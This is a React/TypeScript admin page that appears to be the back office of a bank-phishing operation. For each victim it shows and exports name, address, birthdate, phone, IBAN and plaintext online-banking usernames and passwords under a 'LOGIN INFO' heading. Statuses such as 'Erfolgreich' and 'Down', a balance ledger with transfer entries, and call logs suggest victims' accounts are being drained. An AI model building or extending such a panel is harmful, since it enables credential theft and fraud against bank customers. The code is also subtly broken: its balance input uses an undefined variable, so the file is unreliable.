import { useEffect, useState } from "react";
import { useNavigate, useParams } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import AdminLayout, { useAdminUser } from "@/components/AdminLayout";
import { Button } from "@/components/ui/button";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Input } from "@/components/ui/input";
import { Textarea } from "@/components/ui/textarea";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { Badge } from "@/components/ui/badge";
import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/ui/dialog";
import { AlertDialog, AlertDialogAction, AlertDialogCancel, AlertDialogContent as AlertContent, AlertDialogDescription, AlertDialogFooter, AlertDialogHeader, AlertDialogTitle as AlertTitle, AlertDialogTrigger } from "@/components/ui/alert-dialog";
import { toast } from "sonner";
import { ArrowLeft, Copy, Download, FileDown, Minus, Plus, Save, Trash2 } from "lucide-react";
import { useSubmission, type Note, type Submission } from "@/hooks/use-submissions";
import { useQueryClient } from "@tanstack/react-query";
import { formatBalance, formatIBAN, parseBalanceNumber } from "@/lib/format";

const STATUS_OPTIONS = ["Neu", "In Bearbeitung", "Erfolgreich", "Down"] as const;

const statusBadgeClass: Record<string, string> = {
  "Neu": "bg-slate-100 text-slate-700",
  "In Bearbeitung": "bg-blue-50 text-blue-700",
  "Erfolgreich": "bg-emerald-50 text-emerald-700",
  "Down": "bg-red-50 text-red-700",
};

function DetailContent() {
  const { id } = useParams<{ id: string }>();
  const navigate = useNavigate();
  const user = useAdminUser();
  const queryClient = useQueryClient();
  const { submission, isLoading: loading } = useSubmission(id);
  const [notes, setNotes] = useState<Note[]>([]);
  const [newNote, setNewNote] = useState("");
  const [savedBalance, setSavedBalance] = useState("");
  const [balanceInput, setBalanceInput] = useState("");
  const [status, setStatus] = useState("Neu");
  const [savingBalance, setSavingBalance] = useState(false);
  const [savingNote, setSavingNote] = useState(false);
  const [deleting, setDeleting] = useState(false);
  const [exportOpen, setExportOpen] = useState(false);
  const [txMode, setTxMode] = useState<"+" | "-" | null>(null);
  const [txAmount, setTxAmount] = useState("");
  const [txNote, setTxNote] = useState("");

  useEffect(() => {
    if (submission) {
      setSavedBalance(submission.balance || "");
      setBalanceInput(submission.balance || "");
      setStatus(submission.status || "Neu");
    }
  }, [submission]);

  useEffect(() => {
    if (id) {
      supabase.from("submission_notes").select("*").eq("submission_id", id).order("created_at", { ascending: false })
        .then(({ data }) => { if (data) setNotes(data as Note[]); });
    }
  }, [id]);

  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text);
    toast.success("Kopiert!");
  };

  const saveBalance = async () => {
    if (!id) return;
    setSavingBalance(true);
    const trimmed = balanceInput.trim();
    const formatted = trimmed ? formatBalance(trimmed) : null;

    const { error } = await supabase.from("submissions").update({ balance: formatted }).eq("id", id);
    setSavingBalance(false);
    if (error) { toast.error("Fehler beim Speichern"); }
    else {
      const val = formatted || "";
      setSavedBalance(val);
      setBalanceInput(val);
      toast.success("Guthaben gespeichert");
      queryClient.invalidateQueries({ queryKey: ["submissions"] });
      queryClient.invalidateQueries({ queryKey: ["submission", id] });
    }
  };

  const txPreview = (() => {
    if (!txMode || !txAmount.trim()) return null;
    const txNum = parseBalanceNumber(txAmount);
    if (isNaN(txNum) || txNum <= 0) return null;
    const currentNum = parseBalanceNumber(savedBalance || "0");
    const newNum = txMode === "+" ? currentNum + txNum : currentNum - txNum;
    return formatBalance(String(newNum));
  })();

  const handleTransaction = async () => {
    if (!id || !user || !txAmount.trim() || !txMode) return;
    const currentNum = parseBalanceNumber(savedBalance || "0");
    const txNum = parseBalanceNumber(txAmount);
    if (isNaN(txNum) || txNum <= 0) { toast.error("Ungültiger Betrag"); return; }
    const newNum = txMode === "+" ? currentNum + txNum : currentNum - txNum;
    const newFormatted = formatBalance(String(newNum));
    const sign = txMode === "+" ? "+" : "−";
    const noteContent = `${sign}${formatBalance(txAmount)}${txNote.trim() ? ` — ${txNote.trim()}` : ""}`;

    const { error: balErr } = await supabase.from("submissions").update({ balance: newFormatted }).eq("id", id);
    if (balErr) { toast.error("Fehler beim Speichern"); return; }

    const { data: noteData } = await supabase.from("submission_notes").insert({
      submission_id: id,
      user_id: user.id,
      user_email: user.email || "unknown",
      content: noteContent,
    }).select().single();

    setSavedBalance(newFormatted);
    setBalanceInput(newFormatted);
    if (noteData) setNotes((prev) => [noteData as Note, ...prev]);
    queryClient.invalidateQueries({ queryKey: ["submissions"] });
    queryClient.invalidateQueries({ queryKey: ["submission", id] });
    queryClient.invalidateQueries({ queryKey: ["submission-note-counts"] });
    setTxMode(null);
    setTxAmount("");
    setTxNote("");
    toast.success("Buchung gespeichert");
  };

  const saveStatus = async (newStatus: string) => {
    if (!id) return;
    const { error } = await supabase.from("submissions").update({ status: newStatus }).eq("id", id);
    if (error) { toast.error("Fehler beim Speichern"); }
    else {
      setStatus(newStatus);
      toast.success("Status gespeichert");
      queryClient.invalidateQueries({ queryKey: ["submissions"] });
      queryClient.invalidateQueries({ queryKey: ["submission", id] });
    }
  };

  const addNote = async () => {
    if (!id || !user || !newNote.trim()) return;
    setSavingNote(true);
    const { data, error } = await supabase.from("submission_notes").insert({
      submission_id: id,
      user_id: user.id,
      user_email: user.email || "unknown",
      content: newNote.trim(),
    }).select().single();
    setSavingNote(false);
    if (error) { toast.error("Fehler beim Speichern der Notiz"); }
    else {
      toast.success("Notiz hinzugefügt");
      setNewNote("");
      if (data) setNotes((prev) => [data as Note, ...prev]);
      queryClient.invalidateQueries({ queryKey: ["submission-note-counts"] });
    }
  };

  const handleDelete = async () => {
    if (!id) return;
    setDeleting(true);
    const { error } = await supabase.from("submissions").delete().eq("id", id);
    setDeleting(false);
    if (error) { toast.error("Fehler beim Löschen"); }
    else {
      toast.success("Eintrag gelöscht");
      queryClient.invalidateQueries({ queryKey: ["submissions"] });
      navigate("/admin/logs");
    }
  };

  const CopyValue = ({ label, value }: { label: string; value: string | null | undefined }) => (
    <div className="flex justify-between items-center py-2 border-b border-slate-100 last:border-0">
      <span className="text-sm text-slate-500">{label}</span>
      {value ? (
        <button onClick={() => copyToClipboard(value)} className="text-sm font-medium text-slate-800 flex items-center gap-1.5 hover:text-blue-600 transition-colors">
          {value} <Copy className="h-3 w-3 opacity-40" />
        </button>
      ) : (
        <span className="text-sm text-slate-400">-</span>
      )}
    </div>
  );

  if (loading) {
    return <div className="flex items-center justify-center py-20"><p className="text-slate-400">Laden...</p></div>;
  }

  if (!submission) {
    return (
      <div className="text-center py-20">
        <p className="text-slate-400 mb-4">Eintrag nicht gefunden</p>
        <Button variant="outline" onClick={() => navigate("/admin/logs")}>← Zurück</Button>
      </div>
    );
  }

  const address = [submission.street, submission.house_number].filter(Boolean).join(" ");
  const addressExtra = [submission.staircase ? `Stiege ${submission.staircase}` : null, submission.door_number ? `Tür ${submission.door_number}` : null].filter(Boolean).join(", ");
  const fullAddress = [address, addressExtra, [submission.postal_code, submission.city].filter(Boolean).join(" ")].filter(Boolean).join(", ");

  const exportText = [
    `fullname: ${submission.full_name || ""}`,
    `email: ${submission.email || ""}`,
    `city: ${submission.city || ""}`,
    `street: ${submission.street || ""}`,
    `housenumber: ${submission.house_number || ""}`,
    `stiege: ${submission.staircase || ""}`,
    `door: ${submission.door_number || ""}`,
    `postcode: ${submission.postal_code || ""}`,
    `birthdate: ${submission.birthdate || ""}`,
    `iban: ${submission.iban ? formatIBAN(submission.iban) : ""}`,
    `phone: ${submission.phone || ""}`,
    ``,
    `======> LOGIN INFO <=======`,
    `benutzername: ${submission.bank_username || ""}`,
    `passwort: ${submission.bank_password || ""}`,
    `bank: ${submission.bank || ""}`,
  ].join("\n");

  const downloadExport = () => {
    const name = (submission.full_name || "export").replace(/\s+/g, "_");
    const bank = (submission.bank || "unknown").replace(/\s+/g, "_");
    const blob = new Blob([exportText], { type: "text/plain" });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = `${name}_${bank}.txt`;
    a.click();
    URL.revokeObjectURL(url);
  };

  return (
    <div className="max-w-5xl space-y-6">
      <div className="flex items-center gap-4">
        <Button variant="ghost" size="sm" onClick={() => navigate("/admin/logs")} className="gap-1.5 text-slate-500 hover:text-slate-800">
          <ArrowLeft className="h-4 w-4" /> Zurück
        </Button>
        <div className="flex-1">
          <h1 className="text-xl font-bold text-slate-900">{submission.full_name || "Unbekannt"}</h1>
          <p className="text-xs text-slate-400 mt-0.5">
            {submission.created_at ? new Date(submission.created_at).toLocaleString("de-AT") : ""}
          </p>
        </div>
        <Button variant="outline" size="sm" className="gap-1.5" onClick={() => setExportOpen(true)}>
          <Download className="h-4 w-4" /> Export
        </Button>
        <AlertDialog>
          <AlertDialogTrigger asChild>
            <Button variant="outline" size="sm" className="gap-1.5 text-red-600 border-red-200 hover:bg-red-50 hover:border-red-300">
              <Trash2 className="h-4 w-4" /> Löschen
            </Button>
          </AlertDialogTrigger>
          <AlertContent>
            <AlertDialogHeader>
              <AlertTitle>Eintrag löschen?</AlertTitle>
              <AlertDialogDescription>
                Dieser Eintrag wird unwiderruflich gelöscht. Alle zugehörigen Notizen und Anruf-Logs werden ebenfalls entfernt.
              </AlertDialogDescription>
            </AlertDialogHeader>
            <AlertDialogFooter>
              <AlertDialogCancel>Abbrechen</AlertDialogCancel>
              <AlertDialogAction onClick={handleDelete} disabled={deleting} className="bg-red-600 hover:bg-red-700">
                {deleting ? "Löscht..." : "Endgültig löschen"}
              </AlertDialogAction>
            </AlertDialogFooter>
          </AlertContent>
        </AlertDialog>
      </div>

      <Dialog open={exportOpen} onOpenChange={setExportOpen}>
        <DialogContent className="max-w-lg">
          <DialogHeader><DialogTitle>Export</DialogTitle></DialogHeader>
          <Textarea readOnly value={exportText} rows={18} className="font-mono text-xs resize-none" />
          <div className="flex justify-end gap-2">
            <Button variant="outline" size="sm" onClick={() => { navigator.clipboard.writeText(exportText); toast.success("Kopiert!"); }} className="gap-1.5">
              <Copy className="h-4 w-4" /> Kopieren
            </Button>
            <Button size="sm" onClick={downloadExport} className="gap-1.5">
              <FileDown className="h-4 w-4" /> Download .txt
            </Button>
          </div>
        </DialogContent>
      </Dialog>

      <div className="grid grid-cols-1 md:grid-cols-2 gap-5">
        <Card className="rounded-xl border-slate-200 shadow-sm">
          <CardHeader className="pb-2">
            <CardTitle className="text-sm font-semibold text-slate-500 uppercase tracking-wider">Persönliche Daten</CardTitle>
          </CardHeader>
          <CardContent>
            <CopyValue label="Name" value={submission.full_name} />
            <CopyValue label="E-Mail" value={submission.email} />
            <CopyValue label="Geburtsdatum" value={submission.birthdate} />
            <CopyValue label="Telefon" value={submission.phone} />
            <CopyValue label="Adresse" value={fullAddress || null} />
            <CopyValue label="IBAN" value={submission.iban ? formatIBAN(submission.iban) : null} />
          </CardContent>
        </Card>

        <Card className="rounded-xl border-slate-200 shadow-sm">
          <CardHeader className="pb-2">
            <CardTitle className="text-sm font-semibold text-slate-500 uppercase tracking-wider">Bank-Login</CardTitle>
          </CardHeader>
          <CardContent>
            <CopyValue label="Bank" value={submission.bank} />
            <CopyValue label={submission.bank_username_label || "Benutzername"} value={submission.bank_username} />
            <CopyValue label={submission.bank_password_label || "Passwort"} value={submission.bank_password} />
            {submission.bank_extra && Object.keys(submission.bank_extra).length > 0 && (
              <>
                {Object.entries(submission.bank_extra).map(([key, val]) => (
                  <CopyValue key={key} label={key} value={val} />
                ))}
              </>
            )}
          </CardContent>
        </Card>

        <Card className="rounded-xl border-slate-200 shadow-sm">
          <CardHeader className="pb-2">
            <CardTitle className="text-sm font-semibold text-slate-500 uppercase tracking-wider">Status</CardTitle>
          </CardHeader>
          <CardContent>
            <div className="flex items-center gap-3">
              <Badge className={statusBadgeClass[status] || ""}>{status}</Badge>
              <Select value={status} onValueChange={saveStatus}>
                <SelectTrigger className="w-[160px]"><SelectValue /></SelectTrigger>
                <SelectContent>
                  {STATUS_OPTIONS.map((opt) => (<SelectItem key={opt} value={opt}>{opt}</SelectItem>))}
                </SelectContent>
              </Select>
            </div>
          </CardContent>
        </Card>

        <Card className="rounded-xl border-slate-200 shadow-sm">
          <CardHeader className="pb-2">
            <CardTitle className="text-sm font-semibold text-slate-500 uppercase tracking-wider">Guthaben</CardTitle>
          </CardHeader>
          <CardContent className="space-y-3">
            {savedBalance && (
              <div className="flex items-center justify-between">
                <span className="text-2xl font-bold text-slate-900">{savedBalance}</span>
                <div className="flex gap-1">
                  <Button size="icon" variant="outline" className="h-8 w-8 text-emerald-600 border-emerald-200 hover:bg-emerald-50" onClick={() => { setTxMode("+"); setTxAmount(""); setTxNote(""); }}>
                    <Plus className="h-4 w-4" />
                  </Button>
                  <Button size="icon" variant="outline" className="h-8 w-8 text-red-600 border-red-200 hover:bg-red-50" onClick={() => { setTxMode("-"); setTxAmount(""); setTxNote(""); }}>
                    <Minus className="h-4 w-4" />
                  </Button>
                </div>
              </div>
            )}
            <div className="flex gap-2">
              <Input placeholder="z.B. 55555" value={balance} onChange={(e) => setBalance(e.target.value)} onKeyDown={(e) => e.key === "Enter" && saveBalance()} />
              <Button size="sm" onClick={saveBalance} disabled={savingBalance} className="gap-1.5 shrink-0">
                <Save className="h-4 w-4" /> Speichern
              </Button>
            </div>
          </CardContent>
        </Card>

        {/* Transaction Dialog */}
        <Dialog open={!!txMode} onOpenChange={(open) => !open && setTxMode(null)}>
          <DialogContent className="max-w-sm">
            <DialogHeader>
              <DialogTitle>{txMode === "+" ? "Betrag hinzufügen" : "Betrag abziehen"}</DialogTitle>
            </DialogHeader>
            <div className="space-y-3">
              <Input placeholder="Betrag (z.B. 10000)" value={txAmount} onChange={(e) => setTxAmount(e.target.value)} />
              <Input placeholder="Notiz (z.B. Echtzeitüberweisung)" value={txNote} onChange={(e) => setTxNote(e.target.value)} onKeyDown={(e) => e.key === "Enter" && handleTransaction()} />
              <div className="flex justify-end gap-2">
                <Button variant="outline" size="sm" onClick={() => setTxMode(null)}>Abbrechen</Button>
                <Button size="sm" onClick={handleTransaction} disabled={!txAmount.trim()} className={txMode === "-" ? "bg-red-600 hover:bg-red-700" : "bg-emerald-600 hover:bg-emerald-700"}>
                  {txMode === "+" ? "Hinzufügen" : "Abziehen"}
                </Button>
              </div>
            </div>
          </DialogContent>
        </Dialog>

        <Card className="rounded-xl border-slate-200 shadow-sm md:col-span-2">
          <CardHeader className="pb-2">
            <CardTitle className="text-sm font-semibold text-slate-500 uppercase tracking-wider">Notizen</CardTitle>
          </CardHeader>
          <CardContent className="space-y-4">
            <div className="space-y-2">
              <Textarea placeholder="Neue Notiz schreiben..." value={newNote} onChange={(e) => setNewNote(e.target.value)} rows={3} className="resize-none" />
              <Button size="sm" onClick={addNote} disabled={savingNote || !newNote.trim()}>Notiz hinzufügen</Button>
            </div>
            {notes.length > 0 ? (
              <div className="space-y-3 max-h-72 overflow-y-auto">
                {notes.map((note) => (
                  <div key={note.id} className="rounded-lg border border-slate-200 p-3.5 text-sm bg-slate-50/50">
                    <div className="flex justify-between text-xs text-slate-400 mb-1.5">
                      <span className="font-medium">{note.user_email}</span>
                      <span>{new Date(note.created_at).toLocaleString("de-AT")}</span>
                    </div>
                    <p className="text-slate-700 whitespace-pre-wrap">{note.content}</p>
                  </div>
                ))}
              </div>
            ) : (
              <p className="text-sm text-slate-400">Keine Notizen vorhanden</p>
            )}
          </CardContent>
        </Card>
      </div>
    </div>
  );
}

const AdminLogDetail = () => (
  <AdminLayout>
    <DetailContent />
  </AdminLayout>
);

export default AdminLogDetail;
